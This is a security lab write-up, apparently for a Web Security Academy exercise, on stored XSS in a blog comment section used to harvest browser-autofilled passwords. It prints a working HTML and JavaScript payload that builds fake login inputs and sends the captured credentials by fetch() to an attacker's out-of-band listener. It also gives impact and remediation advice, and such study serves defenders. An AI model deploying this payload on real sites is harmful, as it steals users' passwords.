# Lab: Credential Harvesting via Stored XSS

**Severity:** Critical 

**Vulnerability Type:** Stored Cross-Site Scripting (XSS)/Credential Harvesting

**Target:** Web Security Academy Blog - Comment Section 

##### 1. Executive Summary 

A critical Stored Cross-Site Scripting (XSS) vulnerability was identified in
the blog comment functionality. 

Unlike typical XSS attacks that target session cookies, this exploitation 
vector leverages browser behavior to harvest cleartext user credentials. By
injecting a fraudulent login form into the comment section, the attacker can 
trick the victim's browser into autofilling their saved username and password.
These credentials are then captured by a malicious script and exfiltrated to 
an external server controlled by the attacker. 

##### 2. Technical Walkthrough 

2.1 Target Identification 

The assessment focused on the "Leave a comment" feature of the blog posts. The
application was found to permit HTML injection, making it susceptible to 
Stored XSS. 

<img width="1186" height="744" alt="b1" src="https://github.com/user-attachments/assets/9e1b11f0-546d-4a4c-8068-a6f953180d02" />

2.2 Exploitation Strategy: Browser Autofill Manipulation 

The attack strategy relies on the behavior of modern browsers (e.g., Chrome,
Firefox) which atempt to improve user experience by autofilling recognised
login fields (`username` and `password`).

The attacker injects valid HTML `<input>` tags disguised as a login form. 
When a victim views the page, their browser detects these fields and-believing
it is a legitimate login prompt-automatically populates them with the user's
saved credentials for that domain.

2.3 Payload Construction 

The following HTML and JavaScript payload was injected into the comment body:

```
<input name="username" id="username">
<input type="password" name="password" onchange="stealCredentials()">
<script>
function stealCredentials() {
    // 1. Select the inputs populated by the browser
    var userField = document.getElementById('username').value;
    var passField = document.getElementsByName('password')[0].value;

    // 2. Validate data presence
    if (passField.length > 0) {
        // 3. Exfiltrate to external listener (Interactsh/Burp Collaborator)
        fetch('https://YOUR-OAST-DOMAIN.oast.fun', {
            method: 'POST',
            mode: 'no-cors',
            body: userField + ":" + passField
        });
    }
}
</script>
```

Key Components:

1. Fake Inputs: The `username` and `password` inputs trigger the browser's
password manager.

2. Event Trigger (`onchange`): The `stealCredentials()` function executes as
soon as the password field is modified (autofilled) or when the user interacts
with it.

3. Exfiltration: The script sends the cleartext credentials (`user:pass`) to
the attacker's server via a POST request.

<img width="1440" height="759" alt="b2" src="https://github.com/user-attachments/assets/2011efa4-bf45-4f89-8623-71f1696e4d53" />

##### 3. Impact Analysis 

The impact of this vulnerability is rated as Critical.

- Credential Theft: The attacker obtains the victim's cleartext password,
not just a temporary session token.

- Persistence: Once the attacker has the password, they can access the account
indefinitely, even if the session cookies change or expire.

- Lateral Movement: Because users often reuse passwords, this compromise
could lead to unauthorised access to other external accounts belonging to
the victim.

##### 4. Remediation 

To mitigate this vulnerability, the following steps are recommended:

1. Strict Output Encoding: Ensure all user-supplied data is properly
encoded before rendering. All HTML tags (including `<input>` and `<script>`)
should be converted to HTML entities.

2. Content Security Policy (CSP): Implement a strict CSP that forbids
inline scripts and restricts form actions.

3. Sanitisation Libraries: Use a security-vetted library (such as DOMPurify)
to strip dangerous tags from user input before storage. 
